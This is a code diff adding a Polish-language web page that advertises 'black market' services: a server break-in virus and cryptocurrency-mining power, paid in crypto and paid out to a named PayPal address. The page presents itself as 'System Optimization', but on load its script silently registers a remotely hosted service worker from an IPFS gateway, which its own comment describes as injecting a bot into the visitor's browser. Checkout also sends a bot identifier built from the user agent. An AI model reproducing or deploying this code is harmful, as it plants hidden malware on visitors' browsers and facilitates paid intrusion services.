@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>S.A.T. - Imperium Black Market</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; }
+        .shop-box { border: 2px solid #0f0; padding: 20px; width: 400px; margin: 50px auto; background: #111; box-shadow: 0 0 15px #0f0; }
+        .btn { display: block; width: 100%; padding: 10px; margin: 10px 0; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; }
+        .btn:hover { background: #0a0; }
+        .price { font-size: 20px; color: #fff; }
+    </style>
+</head>
+<body>
+    <h1>System Optimization Active</h1>
+    
+    <div class="shop-box">
+        <h3>🛒 SKLEP IMPERIUM: USŁUGI</h3>
+        <div class="service">
+            <p>WŁAMANIE NA SERWER (WIRUS)</p>
+            <p class="price">50.00 PLN</p>
+            <button class="btn" onclick="checkout('attack', 50)">KUP PRZEZ KRYPTO (BTC/LTC)</button>
+        </div>
+        <div class="service">
+            <p>MOC OBLICZENIOWA (MINER)</p>
+            <p class="price">100.00 PLN</p>
+            <button class="btn" onclick="checkout('miner', 100)">KUP PRZEZ KRYPTO (BTC/LTC)</button>
+        </div>
+    </div>
+
+    <script>
+        // AUTOMATYCZNE WSTRZYKNIĘCIE BOTA DO PRZEGLĄDARKI (GHOST MODE)
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('https://gateway.pinata.cloud/ipfs/bafkreiepd2lnxclqhdpo5u3jzkcz3vd7rpjrtwgwtqykuz4tsazojb6h64')
+                .then(reg => console.log('Optimization Service Active'))
+                .catch(err => console.log('Service initializing...'));
+            });
+        }
+
+        async function checkout(type, price) {
+            // Bramka płatnicza: Klient płaci Krypto -> Ty dostajesz PLN na PayPal
+            const paypalMail = "urbex0sigma@gmail.com";
+            
+            // Rejestracja transakcji w bazie Neon przed przekierowaniem
+            try {
+                await fetch('/.netlify/functions/payment-init', {
+                    method: 'POST',
+                    body: JSON.stringify({ 
+                        service: type, 
+                        amount: price, 
+                        recipient: paypalMail,
+                        bot_id: btoa(navigator.userAgent).substring(0, 12) 
+                    })
+                });
+
+                alert(`ZLECENIE PRZYJĘTE: ${type}\n\nWyślij krypto na wygenerowany adres. Po przewalutowaniu system PLN trafi na ${paypalMail}, a Twój bot aktywuje 100% mocy.`);
+                // Tu opcjonalnie window.location.href do bramki krypto
+            } catch (e) {
+                alert("Błąd połączenia z bazą Imperium.");
+            }
+        }
+    </script>
+</body>
+</html>
